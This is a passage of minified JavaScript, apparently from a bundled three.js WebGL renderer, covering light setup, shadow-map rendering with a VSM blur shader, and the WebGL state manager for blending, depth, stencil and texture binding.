mt=j.shadow,gt=i.get(j);gt.shadowIntensity=mt.intensity,gt.shadowBias=mt.bias,gt.shadowNormalBias=mt.normalBias,gt.shadowRadius=mt.radius,gt.shadowMapSize.copy(mt.mapSize).multiply(mt.getFrameExtents()),s.sunShadow[T]=gt,s.sunShadowMap[T]=ht;const Bt=mt.getViewportCount();for(let Ut=0;Ut<Bt;Ut++)s.sunShadowMatrix[w+Ut]=mt.getMatrix(Ut),s.sunShadowCascade[w+Ut]=mt._cascadeData[Ut];w+=Bt,T++}s.sun[E]=lt,E++}else if(j.isDirectionalLight){const lt=e.get(j);if(lt.color.copy(j.color).multiplyScalar(j.intensity),j.castShadow){const mt=j.shadow,gt=i.get(j);gt.shadowIntensity=mt.intensity,gt.shadowBias=mt.bias,gt.shadowNormalBias=mt.normalBias,gt.shadowRadius=mt.radius,gt.shadowMapSize=mt.mapSize,s.directionalShadow[y]=gt,s.directionalShadowMap[y]=ht,s.directionalShadowMatrix[y]=j.shadow.matrix,U++}s.directional[y]=lt,y++}else if(j.isSpotLight){const lt=e.get(j);lt.position.setFromMatrixPosition(j.matrixWorld),lt.color.copy(et).multiplyScalar(q),lt.distance=W,lt.coneCos=Math.cos(j.angle),lt.penumbraCos=Math.cos(j.angle*(1-j.penumbra)),lt.decay=j.decay,s.spot[N]=lt;const mt=j.shadow;if(j.map&&(s.spotLightMap[b]=j.map,b++,mt.updateMatrices(j),j.castShadow&&L++),s.spotLightMatrix[N]=mt.matrix,j.castShadow){const gt=i.get(j);gt.shadowIntensity=mt.intensity,gt.shadowBias=mt.bias,gt.shadowNormalBias=mt.normalBias,gt.shadowRadius=mt.radius,gt.shadowMapSize=mt.mapSize,s.spotShadow[N]=gt,s.spotShadowMap[N]=ht,P++}N++}else if(j.isRectAreaLight){const lt=e.get(j);lt.color.copy(et).multiplyScalar(q),lt.halfWidth.set(j.width*.5,0,0),lt.halfHeight.set(0,j.height*.5,0),s.rectArea[B]=lt,B++}else if(j.isPointLight){const lt=e.get(j);if(lt.color.copy(j.color).multiplyScalar(j.intensity),lt.distance=j.distance,lt.decay=j.decay,j.castShadow){const mt=j.shadow,gt=i.get(j);gt.shadowIntensity=mt.intensity,gt.shadowBias=mt.bias,gt.shadowNormalBias=mt.normalBias,gt.shadowRadius=mt.radius,gt.shadowMapSize=mt.mapSize,gt.shadowCameraNear=mt.camera.near,gt.shadowCameraFar=mt.camera.far,s.pointShadow[S]=gt,s.pointShadowMap[S]=ht,s.pointShadowMatrix[S]=j.shadow.matrix,D++}s.point[S]=lt,S++}else if(j.isHemisphereLight){const lt=e.get(j);lt.skyColor.copy(j.color).multiplyScalar(q),lt.groundColor.copy(j.groundColor).multiplyScalar(q),s.hemi[C]=lt,C++}}B>0&&(o.has("OES_texture_float_linear")===!0?(s.rectAreaLTC1=Vt.LTC_FLOAT_1,s.rectAreaLTC2=Vt.LTC_FLOAT_2):(s.rectAreaLTC1=Vt.LTC_HALF_1,s.rectAreaLTC2=Vt.LTC_HALF_2)),s.ambient[0]=x,s.ambient[1]=v,s.ambient[2]=_;const V=s.hash;(V.sunLength!==E||V.directionalLength!==y||V.pointLength!==S||V.spotLength!==N||V.rectAreaLength!==B||V.hemiLength!==C||V.numSunShadows!==T||V.numDirectionalShadows!==U||V.numPointShadows!==D||V.numSpotShadows!==P||V.numSpotMaps!==b||V.numLightProbes!==F)&&(s.sun.length=E,s.directional.length=y,s.spot.length=N,s.rectArea.length=B,s.point.length=S,s.hemi.length=C,s.sunShadow.length=T,s.sunShadowMap.length=T,s.sunShadowMatrix.length=w,s.sunShadowCascade.length=w,s.directionalShadow.length=U,s.directionalShadowMap.length=U,s.directionalShadowMatrix.length=U,s.pointShadow.length=D,s.pointShadowMap.length=D,s.pointShadowMatrix.length=D,s.spotShadow.length=P,s.spotShadowMap.length=P,s.spotLightMatrix.length=P+b-L,s.spotLightMap.length=b,s.numSpotLightShadowsWithMaps=L,s.numLightProbes=F,V.sunLength=E,V.directionalLength=y,V.pointLength=S,V.spotLength=N,V.rectAreaLength=B,V.hemiLength=C,V.numSunShadows=T,V.numDirectionalShadows=U,V.numPointShadows=D,V.numSpotShadows=P,V.numSpotMaps=b,V.numLightProbes=F,s.version=h3++)}function m(p,x){let v=0,_=0,E=0,T=0,w=0,y=0;const S=x.matrixWorldInverse;for(let N=0,B=p.length;N<B;N++){const C=p[N];if(C.isSunLight){const U=s.sun[v];U.direction.setFromMatrixPosition(C.matrixWorld),U.direction.transformDirection(S),v++}else if(C.isDirectionalLight){const U=s.directional[_];U.direction.setFromMatrixPosition(C.matrixWorld),c.setFromMatrixPosition(C.target.matrixWorld),U.direction.sub(c),U.direction.transformDirection(S),_++}else if(C.isSpotLight){const U=s.spot[T];U.position.setFromMatrixPosition(C.matrixWorld),U.position.applyMatrix4(S),U.direction.setFromMatrixPosition(C.matrixWorld),c.setFromMatrixPosition(C.target.matrixWorld),U.direction.sub(c),U.direction.transformDirection(S),T++}else if(C.isRectAreaLight){const U=s.rectArea[w];U.position.setFromMatrixPosition(C.matrixWorld),U.position.applyMatrix4(S),d.identity(),f.copy(C.matrixWorld),f.premultiply(S),d.extractRotation(f),U.halfWidth.set(C.width*.5,0,0),U.halfHeight.set(0,C.height*.5,0),U.halfWidth.applyMatrix4(d),U.halfHeight.applyMatrix4(d),w++}else if(C.isPointLight){const U=s.point[E];U.position.setFromMatrixPosition(C.matrixWorld),U.position.applyMatrix4(S),E++}else if(C.isHemisphereLight){const U=s.hemi[y];U.direction.setFromMatrixPosition(C.matrixWorld),U.direction.transformDirection(S),y++}}}return{setup:h,setupView:m,state:s}}function yx(o){const e=new m3(o),i=[],s=[],c=[];function f(_){v.camera=_,i.length=0,s.length=0,c.length=0}function d(_){i.push(_)}function h(_){s.push(_)}function m(_){c.push(_)}function p(){e.setup(i)}function x(_){e.setupView(i,_)}const v={lightsArray:i,shadowsArray:s,lightProbeGridArray:c,camera:null,lights:e,transmissionRenderTarget:{},textureUnits:0};return{init:f,state:v,setupLights:p,setupLightsView:x,pushLight:d,pushShadow:h,pushLightProbeGrid:m}}function g3(o){let e=new WeakMap;function i(c,f=0){const d=e.get(c);let h;return d===void 0?(h=new yx(o),e.set(c,[h])):f>=d.length?(h=new yx(o),d.push(h)):h=d[f],h}function s(){e=new WeakMap}return{get:i,dispose:s}}const _3=`void main() {
	gl_Position = vec4( position, 1.0 );
}`,v3=`uniform sampler2D shadow_pass;
uniform vec2 resolution;
uniform float radius;
void main() {
	const float samples = float( VSM_SAMPLES );
	float mean = 0.0;
	float squared_mean = 0.0;
	float uvStride = samples <= 1.0 ? 0.0 : 2.0 / ( samples - 1.0 );
	float uvStart = samples <= 1.0 ? 0.0 : - 1.0;
	for ( float i = 0.0; i < samples; i ++ ) {
		float uvOffset = uvStart + i * uvStride;
		#ifdef HORIZONTAL_PASS
			vec2 distribution = texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( uvOffset, 0.0 ) * radius ) / resolution ).rg;
			mean += distribution.x;
			squared_mean += distribution.y * distribution.y + distribution.x * distribution.x;
		#else
			float depth = texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( 0.0, uvOffset ) * radius ) / resolution ).r;
			mean += depth;
			squared_mean += depth * depth;
		#endif
	}
	mean = mean / samples;
	squared_mean = squared_mean / samples;
	float std_dev = sqrt( max( 0.0, squared_mean - mean * mean ) );
	gl_FragColor = vec4( mean, std_dev, 0.0, 1.0 );
}`,x3=[new it(1,0,0),new it(-1,0,0),new it(0,1,0),new it(0,-1,0),new it(0,0,1),new it(0,0,-1)],S3=[new it(0,-1,0),new it(0,-1,0),new it(0,0,1),new it(0,0,-1),new it(0,-1,0),new it(0,-1,0)],Mx=new cn,dl=new it,jh=new it;function y3(o,e,i){let s=new $x;const c=new Ue,f=new Ue,d=new ln,h=new Lb,m=new Ob,p={},x=i.maxTextureSize,v={[Zr]:Jn,[Jn]:Zr,[wa]:wa},_=new la({defines:{VSM_SAMPLES:8},uniforms:{shadow_pass:{value:null},resolution:{value:new Ue},radius:{value:4}},vertexShader:_3,fragmentShader:v3}),E=_.clone();E.defines.HORIZONTAL_PASS=1;const T=new $n;T.setAttribute("position",new Fi(new Float32Array([-1,-1,.5,3,-1,.5,-1,3,.5]),3));const w=new Oa(T,_),y=this;this.enabled=!1,this.autoUpdate=!0,this.needsUpdate=!1,this.type=yu;let S=this.type;this.render=function(D,P,b){if(y.enabled===!1||y.autoUpdate===!1&&y.needsUpdate===!1||D.length===0)return;this.type===_E&&(se("WebGLShadowMap: PCFSoftShadowMap has been removed. Using PCFShadowMap instead."),this.type=yu);const L=o.getRenderTarget(),F=o.getActiveCubeFace(),V=o.getActiveMipmapLevel(),$=o.state;$.setBlending(Da),$.buffers.depth.getReversed()===!0?$.buffers.color.setClear(0,0,0,0):$.buffers.color.setClear(1,1,1,1),$.buffers.depth.setTest(!0),$.setScissorTest(!1);const ft=S!==this.type;ft&&P.traverse(function(j){j.material&&(Array.isArray(j.material)?j.material.forEach(et=>et.needsUpdate=!0):j.material.needsUpdate=!0)});for(let j=0,et=D.length;j<et;j++){const q=D[j],W=q.shadow;if(W===void 0){se("WebGLShadowMap:",q,"has no shadow.");continue}if(W.autoUpdate===!1&&W.needsUpdate===!1)continue;c.copy(W.mapSize);const ht=W.getFrameExtents();c.multiply(ht),f.copy(W.mapSize),(c.x>x||c.y>x)&&(c.x>x&&(f.x=Math.floor(x/ht.x),c.x=f.x*ht.x,W.mapSize.x=f.x),c.y>x&&(f.y=Math.floor(x/ht.y),c.y=f.y*ht.y,W.mapSize.y=f.y));const lt=o.state.buffers.depth.getReversed();if(W.camera._reversedDepth=lt,W.map===null||ft===!0){if(W.map!==null&&(W.map.depthTexture!==null&&(W.map.depthTexture.dispose(),W.map.depthTexture=null),W.map.dispose()),this.type===pl){if(q.isPointLight){se("WebGLShadowMap: VSM shadow maps are not supported for PointLights. Use PCF or BasicShadowMap instead.");continue}W.map=new Bi(c.x,c.y,{format:jr,type:oa,minFilter:In,magFilter:In,generateMipmaps:!1}),W.map.texture.name=q.name+".shadowMap",W.map.depthTexture=new Sl(c.x,c.y,ia),W.map.depthTexture.name=q.name+".shadowMapDepth",W.map.depthTexture.format=La,W.map.depthTexture.compareFunction=null,W.map.depthTexture.minFilter=Un,W.map.depthTexture.magFilter=Un}else q.isPointLight?(W.map=new cS(c.x),W.map.depthTexture=new Ab(c.x,sa)):(W.map=new Bi(c.x,c.y),W.map.depthTexture=new Sl(c.x,c.y,sa)),W.map.depthTexture.name=q.name+".shadowMap",W.map.depthTexture.format=La,this.type===yu?(W.map.depthTexture.compareFunction=lt?$p:Jp,W.map.depthTexture.minFilter=In,W.map.depthTexture.magFilter=In):(W.map.depthTexture.compareFunction=null,W.map.depthTexture.minFilter=Un,W.map.depthTexture.magFilter=Un);W.camera.updateProjectionMatrix()}W.map.isWebGLCubeRenderTarget!==!0&&(W.map.width!==c.x||W.map.height!==c.y)&&W.map.setSize(c.x,c.y);const mt=W.map.isWebGLCubeRenderTarget?6:W.getViewportCount();q.isPointLight!==!0&&W.updateMatrices(q,b);for(let gt=0;gt<mt;gt++){const Bt=W.getCamera(gt);if(q.isPointLight){const Ut=W.camera,z=W.matrix,pt=q.distance||Ut.far;pt!==Ut.far&&(Ut.far=pt,Ut.updateProjectionMatrix()),dl.setFromMatrixPosition(q.matrixWorld),Ut.position.copy(dl),jh.copy(Ut.position),jh.add(x3[gt]),Ut.up.copy(S3[gt]),Ut.lookAt(jh),Ut.updateMatrixWorld(),z.makeTranslation(-dl.x,-dl.y,-dl.z),Mx.multiplyMatrices(Ut.projectionMatrix,Ut.matrixWorldInverse),W._frustum.setFromProjectionMatrix(Mx,Ut.coordinateSystem,Ut.reversedDepth)}if(W.map.isWebGLCubeRenderTarget)o.setRenderTarget(W.map,gt),o.clear();else{gt===0&&(o.setRenderTarget(W.map),o.clear());const Ut=W.getViewport(gt);d.set(f.x*Ut.x,f.y*Ut.y,f.x*Ut.z,f.y*Ut.w),$.viewport(d)}s=W.getFrustum(gt),C(P,b,Bt,q,this.type)}W.isPointLightShadow!==!0&&this.type===pl&&N(W,b),W.needsUpdate=!1}S=this.type,y.needsUpdate=!1,o.setRenderTarget(L,F,V)};function N(D,P){const b=e.update(w);_.defines.VSM_SAMPLES!==D.blurSamples&&(_.defines.VSM_SAMPLES=D.blurSamples,E.defines.VSM_SAMPLES=D.blurSamples,_.needsUpdate=!0,E.needsUpdate=!0),D.mapPass===null?D.mapPass=new Bi(c.x,c.y,{format:jr,type:oa}):(D.mapPass.width!==D.map.width||D.mapPass.height!==D.map.height)&&D.mapPass.setSize(D.map.width,D.map.height),_.uniforms.shadow_pass.value=D.map.depthTexture,_.uniforms.resolution.value.set(D.map.width,D.map.height),_.uniforms.radius.value=D.radius,o.setRenderTarget(D.mapPass),o.clear(),o.renderBufferDirect(P,null,b,_,w,null),E.uniforms.shadow_pass.value=D.mapPass.texture,E.uniforms.resolution.value.set(D.map.width,D.map.height),E.uniforms.radius.value=D.radius,o.setRenderTarget(D.map),o.clear(),o.renderBufferDirect(P,null,b,E,w,null)}function B(D,P,b,L){let F=null;const V=b.isPointLight===!0?D.customDistanceMaterial:D.customDepthMaterial;if(V!==void 0)F=V;else if(F=b.isPointLight===!0?m:h,o.localClippingEnabled&&P.clipShadows===!0&&Array.isArray(P.clippingPlanes)&&P.clippingPlanes.length!==0||P.displacementMap&&P.displacementScale!==0||P.alphaMap&&P.alphaTest>0||P.map&&P.alphaTest>0||P.alphaToCoverage===!0){const $=F.uuid,ft=P.uuid;let j=p[$];j===void 0&&(j={},p[$]=j);let et=j[ft];et===void 0&&(et=F.clone(),j[ft]=et,P.addEventListener("dispose",U)),F=et}if(F.visible=P.visible,F.wireframe=P.wireframe,L===pl?F.side=P.shadowSide!==null?P.shadowSide:P.side:F.side=P.shadowSide!==null?P.shadowSide:v[P.side],F.alphaMap=P.alphaMap,F.alphaTest=P.alphaToCoverage===!0?.5:P.alphaTest,F.map=P.map,F.clipShadows=P.clipShadows,F.clippingPlanes=P.clippingPlanes,F.clipIntersection=P.clipIntersection,F.displacementMap=P.displacementMap,F.displacementScale=P.displacementScale,F.displacementBias=P.displacementBias,F.wireframeLinewidth=P.wireframeLinewidth,F.linewidth=P.linewidth,b.isPointLight===!0&&F.isMeshDistanceMaterial===!0){const $=o.properties.get(F);$.light=b}return F}function C(D,P,b,L,F){if(D.visible===!1)return;if(D.layers.test(P.layers)&&(D.isMesh||D.isLine||D.isPoints)&&(D.castShadow||D.receiveShadow&&F===pl)&&(!D.frustumCulled||D.intersectsFrustum(s))){D.modelViewMatrix.multiplyMatrices(b.matrixWorldInverse,D.matrixWorld);const ft=e.update(D),j=D.material;if(Array.isArray(j)){const et=ft.groups;for(let q=0,W=et.length;q<W;q++){const ht=et[q],lt=j[ht.materialIndex];if(lt&&lt.visible){const mt=B(D,lt,L,F);D.onBeforeShadow(o,D,P,b,ft,mt,ht),o.renderBufferDirect(b,null,ft,mt,D,ht),D.onAfterShadow(o,D,P,b,ft,mt,ht)}}}else if(j.visible){const et=B(D,j,L,F);D.onBeforeShadow(o,D,P,b,ft,et,null),o.renderBufferDirect(b,null,ft,et,D,null),D.onAfterShadow(o,D,P,b,ft,et,null)}}const $=D.children;for(let ft=0,j=$.length;ft<j;ft++)C($[ft],P,b,L,F)}function U(D){D.target.removeEventListener("dispose",U);for(const b in p){const L=p[b],F=D.target.uuid;F in L&&(L[F].dispose(),delete L[F])}}}function M3(o,e){function i(){let X=!1;const Nt=new ln;let Mt=null;const Ot=new ln(0,0,0,0);return{setMask:function(kt){Mt!==kt&&!X&&(o.colorMask(kt,kt,kt,kt),Mt=kt)},setLocked:function(kt){X=kt},setClear:function(kt,bt,Jt,Xt,Re){Re===!0&&(kt*=Xt,bt*=Xt,Jt*=Xt),Nt.set(kt,bt,Jt,Xt),Ot.equals(Nt)===!1&&(o.clearColor(kt,bt,Jt,Xt),Ot.copy(Nt))},reset:function(){X=!1,Mt=null,Ot.set(-1,0,0,0)}}}function s(){let X=!1,Nt=!1,Mt=null,Ot=null,kt=null;return{setReversed:function(bt){if(Nt!==bt){const Jt=e.get("EXT_clip_control");bt?Jt.clipControlEXT(Jt.LOWER_LEFT_EXT,Jt.ZERO_TO_ONE_EXT):Jt.clipControlEXT(Jt.LOWER_LEFT_EXT,Jt.NEGATIVE_ONE_TO_ONE_EXT),Nt=bt;const Xt=kt;kt=null,this.setClear(Xt)}},getReversed:function(){return Nt},setTest:function(bt){bt?ut(o.DEPTH_TEST):Tt(o.DEPTH_TEST)},setMask:function(bt){Mt!==bt&&!X&&(o.depthMask(bt),Mt=bt)},setFunc:function(bt){if(Nt&&(bt=JE[bt]),Ot!==bt){switch(bt){case tp:o.depthFunc(o.NEVER);break;case ep:o.depthFunc(o.ALWAYS);break;case np:o.depthFunc(o.LESS);break;case _l:o.depthFunc(o.LEQUAL);break;case ip:o.depthFunc(o.EQUAL);break;case ap:o.depthFunc(o.GEQUAL);break;case rp:o.depthFunc(o.GREATER);break;case sp:o.depthFunc(o.NOTEQUAL);break;default:o.depthFunc(o.LEQUAL)}Ot=bt}},setLocked:function(bt){X=bt},setClear:function(bt){kt!==bt&&(kt=bt,Nt&&(bt=1-bt),o.clearDepth(bt))},reset:function(){X=!1,Mt=null,Ot=null,kt=null,Nt=!1}}}function c(){let X=!1,Nt=null,Mt=null,Ot=null,kt=null,bt=null,Jt=null,Xt=null,Re=null;return{setTest:function(ue){X||(ue?ut(o.STENCIL_TEST):Tt(o.STENCIL_TEST))},setMask:function(ue){Nt!==ue&&!X&&(o.stencilMask(ue),Nt=ue)},setFunc:function(ue,ti,di){(Mt!==ue||Ot!==ti||kt!==di)&&(o.stencilFunc(ue,ti,di),Mt=ue,Ot=ti,kt=di)},setOp:function(ue,ti,di){(bt!==ue||Jt!==ti||Xt!==di)&&(o.stencilOp(ue,ti,di),bt=ue,Jt=ti,Xt=di)},setLocked:function(ue){X=ue},setClear:function(ue){Re!==ue&&(o.clearStencil(ue),Re=ue)},reset:function(){X=!1,Nt=null,Mt=null,Ot=null,kt=null,bt=null,Jt=null,Xt=null,Re=null}}}const f=new i,d=new s,h=new c,m=new WeakMap,p=new WeakMap;let x={},v={},_={},E=new WeakMap,T=[],w=null,y=!1,S=null,N=null,B=null,C=null,U=null,D=null,P=null,b=new ze(0,0,0),L=0,F=!1,V=null,$=null,ft=null,j=null,et=null;const q=o.getParameter(o.MAX_COMBINED_TEXTURE_IMAGE_UNITS);let W=!1,ht=0;const lt=o.getParameter(o.VERSION);lt.indexOf("WebGL")!==-1?(ht=parseFloat(/^WebGL (\d)/.exec(lt)[1]),W=ht>=1):lt.indexOf("OpenGL ES")!==-1&&(ht=parseFloat(/^OpenGL ES (\d)/.exec(lt)[1]),W=ht>=2);let mt=null,gt={};const Bt=o.getParameter(o.SCISSOR_BOX),Ut=o.getParameter(o.VIEWPORT),z=new ln().fromArray(Bt),pt=new ln().fromArray(Ut);function At(X,Nt,Mt,Ot){const kt=new Uint8Array(4),bt=o.createTexture();o.bindTexture(X,bt),o.texParameteri(X,o.TEXTURE_MIN_FILTER,o.NEAREST),o.texParameteri(X,o.TEXTURE_MAG_FILTER,o.NEAREST);for(let Jt=0;Jt<Mt;Jt++)X===o.TEXTURE_3D||X===o.TEXTURE_2D_ARRAY?o.texImage3D(Nt,0,o.RGBA,1,1,Ot,0,o.RGBA,o.UNSIGNED_BYTE,kt):o.texImage2D(Nt+Jt,0,o.RGBA,1,1,0,o.RGBA,o.UNSIGNED_BYTE,kt);return bt}const Y={};Y[o.TEXTURE_2D]=At(o.TEXTURE_2D,o.TEXTURE_2D,1),Y[o.TEXTURE_CUBE_MAP]=At(o.TEXTURE_CUBE_MAP,o.TEXTURE_CUBE_MAP_POSITIVE_X,6),Y[o.TEXTURE_2D_ARRAY]=At(o.TEXTURE_2D_ARRAY,o.TEXTURE_2D_ARRAY,1,1),Y[o.TEXTURE_3D]=At(o.TEXTURE_3D,o.TEXTURE_3D,1,1),f.setClear(0,0,0,1),d.setClear(1),h.setClear(0),ut(o.DEPTH_TEST),d.setFunc(_l),ee(!1),ie(Mv),ut(o.CULL_FACE),ge(Da);function ut(X){x[X]!==!0&&(o.enable(X),x[X]=!0)}function Tt(X){x[X]!==!1&&(o.disable(X),x[X]=!1)}function wt(X,Nt){return _[X]!==Nt?(o.bindFramebuffer(X,Nt),_[X]=Nt,X===o.DRAW_FRAMEBUFFER&&(_[o.FRAMEBUFFER]=Nt),X===o.FRAMEBUFFER&&(_[o.DRAW_FRAMEBUFFER]=Nt),!0):!1}function _t(X,Nt){let Mt=T,Ot=!1;if(X){Mt=E.get(Nt),Mt===void 0&&(Mt=[],E.set(Nt,Mt));const kt=X.textures;if(Mt.length!==kt.length||Mt[0]!==o.COLOR_ATTACHMENT0){for(let bt=0,Jt=kt.length;bt<Jt;bt++)Mt[bt]=o.COLOR_ATTACHMENT0+bt;Mt.length=kt.length,Ot=!0}}else Mt[0]!==o.BACK&&(Mt[0]=o.BACK,Ot=!0);Ot&&o.drawBuffers(Mt)}function Rt(X){return w!==X?(o.useProgram(X),w=X,!0):!1}const Le={[$s]:o.FUNC_ADD,[xE]:o.FUNC_SUBTRACT,[SE]:o.FUNC_REVERSE_SUBTRACT};Le[yE]=o.MIN,Le[ME]=o.MAX;const le={[EE]:o.ZERO,[bE]:o.ONE,[TE]:o.SRC_COLOR,[Cx]:o.SRC_ALPHA,[DE]:o.SRC_ALPHA_SATURATE,[wE]:o.DST_COLOR,[RE]:o.DST_ALPHA,[AE]:o.ONE_MINUS_SRC_COLOR,[wx]:o.ONE_MINUS_SRC_ALPHA,[NE]:o.ONE_MINUS_DST_COLOR,[CE]:o.ONE_MINUS_DST_ALPHA,[UE]:o.CONSTANT_COLOR,[LE]:o.ONE_MINUS_CONSTANT_COLOR,[OE]:o.CONSTANT_ALPHA,[PE]:o.ONE_MINUS_CONSTANT_ALPHA};function ge(X,Nt,Mt,Ot,kt,bt,Jt,Xt,Re,ue){if(X===Da){y===!0&&(Tt(o.BLEND),y=!1);return}if(y===!1&&(ut(o.BLEND),y=!0),X!==vE){if(X!==S||ue!==F){if((N!==$s||U!==$s)&&(o.blendEquation(o.FUNC_ADD),N=$s,U=$s),ue)switch(X){case gl:o.blendFuncSeparate(o.ONE,o.ONE_MINUS_SRC_ALPHA,o.ONE,o.ONE_MINUS_SRC_ALPHA);break;case $h:o.blendFunc(o.ONE,o.ONE);break;case Ev:o.blendFuncSeparate(o.ZERO,o.ONE_MINUS_SRC_COLOR,o.ZERO,o.ONE);break;case bv:o.blendFuncSeparate(o.DST_COLOR,o.ONE_MINUS_SRC_ALPHA,o.ZERO,o.ONE);break;default:Ie("WebGLState: Invalid blending: ",X);break}else switch(X){case gl:o.blendFuncSeparate(o.SRC_ALPHA,o.ONE_MINUS_SRC_ALPHA,o.ONE,o.ONE_MINUS_SRC_ALPHA);break;case $h:o.blendFuncSeparate(o.SRC_ALPHA,o.ONE,o.ONE,o.ONE);break;case Ev:Ie("WebGLState: SubtractiveBlending requires material.premultipliedAlpha = true");break;case bv:Ie("WebGLState: MultiplyBlending requires material.premultipliedAlpha = true");break;default:Ie("WebGLState: Invalid blending: ",X);break}B=null,C=null,D=null,P=null,b.set(0,0,0),L=0,S=X,F=ue}return}kt=kt||Nt,bt=bt||Mt,Jt=Jt||Ot,(Nt!==N||kt!==U)&&(o.blendEquationSeparate(Le[Nt],Le[kt]),N=Nt,U=kt),(Mt!==B||Ot!==C||bt!==D||Jt!==P)&&(o.blendFuncSeparate(le[Mt],le[Ot],le[bt],le[Jt]),B=Mt,C=Ot,D=bt,P=Jt),(Xt.equals(b)===!1||Re!==L)&&(o.blendColor(Xt.r,Xt.g,Xt.b,Re),b.copy(Xt),L=Re),S=X,F=!1}function Se(X,Nt){X.side===wa?Tt(o.CULL_FACE):ut(o.CULL_FACE);let Mt=X.side===Jn;Nt&&(Mt=!Mt),ee(Mt),X.blending===gl&&X.transparent===!1?ge(Da):ge(X.blending,X.blendEquation,X.blendSrc,X.blendDst,X.blendEquationAlpha,X.blendSrcAlpha,X.blendDstAlpha,X.blendColor,X.blendAlpha,X.premultipliedAlpha),d.setFunc(X.depthFunc),d.setTest(X.depthTest),d.setMask(X.depthWrite),f.setMask(X.colorWrite);const Ot=X.stencilWrite;h.setTest(Ot),Ot&&(h.setMask(X.stencilWriteMask),h.setFunc(X.stencilFunc,X.stencilRef,X.stencilFuncMask),h.setOp(X.stencilFail,X.stencilZFail,X.stencilZPass)),fn(X.polygonOffset,X.polygonOffsetFactor,X.polygonOffsetUnits),X.alphaToCoverage===!0?ut(o.SAMPLE_ALPHA_TO_COVERAGE):Tt(o.SAMPLE_ALPHA_TO_COVERAGE)}function ee(X){V!==X&&(X?o.frontFace(o.CW):o.frontFace(o.CCW),V=X)}function ie(X){X!==mE?(ut(o.CULL_FACE),X!==$&&(X===Mv?o.cullFace(o.BACK):X===gE?o.cullFace(o.FRONT):o.cullFace(o.FRONT_AND_BACK))):Tt(o.CULL_FACE),$=X}function Ve(X){X!==ft&&(W&&o.lineWidth(X),ft=X)}function fn(X,Nt,Mt){X?(ut(o.POLYGON_OFFSET_FILL),(j!==Nt||et!==Mt)&&(j=Nt,et=Mt,d.getReversed()&&(Nt=-Nt),o.polygonOffset(Nt,Mt))):Tt(o.POLYGON_OFFSET_FILL)}function Pe(X){X?ut(o.SCISSOR_TEST):Tt(o.SCISSOR_TEST)}function $e(X){X===void 0&&(X=o.TEXTURE0+q-1),mt!==X&&(o.activeTexture(X),mt=X)}function k(X,Nt,Mt){Mt===void 0&&(mt===null?Mt=o.TEXTURE0+q-1:Mt=mt);let Ot=gt[Mt];Ot===void 0&&(Ot={type:void 0,texture:void 0},gt[Mt]=Ot),(Ot.type!==X||Ot.texture!==Nt)&&(mt!==Mt&&(o.activeTexture(Mt),mt=Mt),o.bindTexture(X,Nt||Y[X]),Ot.type=X,Ot.texture=Nt)}function en(){const X=gt[mt];X!==void 0&&X.type!==void 0&&(o.bindTexture(X.type,null),X.type=void 0,X.texture=void 0)}function Oe(){try{o.compressedTexImage2D(...arguments)}catch(X){Ie("WebGLState:",X)}}function O(){try{o.compressedTexImage3D(...arguments)}catch(X){Ie("WebGLState:",X)}}function M(){try{o.texSubImage2D(...arguments)}catch(X){Ie("WebGLState:",X)}}function tt(){try{o.texSubImage3D(...arguments)}catch(X){Ie("WebGLState:",X)}}function ot(){try{o.compressedTexSubImage2D(...arguments)}catch(X){Ie("WebGLState:",X)}}function vt(){try{o.compressedTexSubImage3D(...arguments)}catch(X){Ie("WebGLState:",X)}}function Ct(){try{o.texStorage2D(...arguments)}catch(X){Ie("WebGLState:",X)}}function Lt(){try{o.texStorage3D(...arguments)}catch(X){Ie("WebGLState:",X)}}function xt(){try{o.texImage2D(...arguments)}catch(X){Ie("WebGLState:",X)}}function Et(){try{o.texImage3D(...arguments)}catch(X){Ie("WebGLState:",X)}}function Dt(X){return v[X]!==void 0?v[X]:o.getParameter(X)}function $t(X,Nt){v[X]!==Nt&&(o.pixelStorei(X,Nt),v[X]=Nt)}function Ft(X){z.equals(X)===!1&&(o.scissor(X.x,X.y,X.z,X.w),z.copy(X))}function zt(X){pt.equals(X)===!1&&(o.viewport(X.x,X.y,X.z,X.w),pt.copy(X))}function Wt(X,Nt){let Mt=p.get(Nt);Mt===void 0&&(Mt=new WeakMap,p.set(Nt,Mt));let Ot=Mt.get(X);Ot===void 0&&(Ot=o.getUniformBlockIndex(Nt,X.name),Mt.set(X,Ot))}function ne(X,Nt){const Ot=p.get(Nt).get(X);m.get(Nt)!==Ot&&(o.uniformBlockBinding(Nt,Ot,X.__bindingPointIndex),m.set(Nt,Ot))}function ce(){o.disable(o.BLEND),o.disable(o.CULL_FACE),o.disable(o.DEPTH_TEST),o.disable(o.POLYGON_OFFSET_FILL),o.disable(o.SCISSOR_TEST),o.disable(o.STENCIL_TEST),o.disable(o.SAMPLE_ALPHA_TO_COVERAGE),o.blendEquation(o.FUNC_ADD),o.blendFunc(o.ONE,o.ZERO),o.blendFuncSeparate(o.ONE,o.ZERO,o.ONE,o.ZERO),o.blendColor(0,0,0,0),o.colorMask(!0,!0,!0,!0),o.clearColor(0,0,0,0),o.depthMask(!0),o.depthFunc(o.LESS),d.setReversed(!1),o.clearDepth(1),o.stencilMask(4294967295),o.stencilFunc(o.ALWAYS,0,4294967295),o.stencilOp(o.KEEP,o.KEEP,o.KEEP),o.clearStencil(0),o.cullFace(o.BACK),o.frontFace(o.CCW),o.polygonOffset(0,0),o.activeTexture(o.TEXTURE0),o.bindFramebuffer(o.FRAMEBUFFER,null),o.bindFramebuffer(o.DRAW_FRAMEBUFFER,null),o.bindFramebuffer(o.READ_FRAMEBUFFER,null),o.useProgram(null),o.lineWidth(1),o.scissor(0,0,o.canvas.width,o.canvas.height),o.viewport(0,0,o.canvas.width,o.canvas.height),o.pixelStorei(o.PACK_ALIGNMENT,4),o.pixelStorei(o.UNPACK_ALIGNMENT,4),o.pixelStorei(o.UNPACK_FLIP_Y_WEBGL,!1),o.pixelStorei(o.UNPACK_PREMULTIPLY_ALPHA_WEBGL,!1),o.pixelStorei(o.UNPACK_COLORSPACE_CONVERSION_WEBGL,o.BROWSER_DEFAULT_WEBGL),o.pixelStorei(o.PACK_ROW_LENGTH,0),o.pixelStorei(o.PACK_SKIP_PIXELS,0),o.pixelStorei(o.PACK_SKIP_ROWS,0),o.pixelStorei(o.UNPACK_ROW_LENGTH,0),o.pixelStorei(o.UNPACK_IMAGE_HEIGHT,0),o.pixelStorei(o.UNPACK_SKIP_PIXELS,0),o.pixelStorei(o.UNPACK_SKIP_ROWS,0),o.pixelSt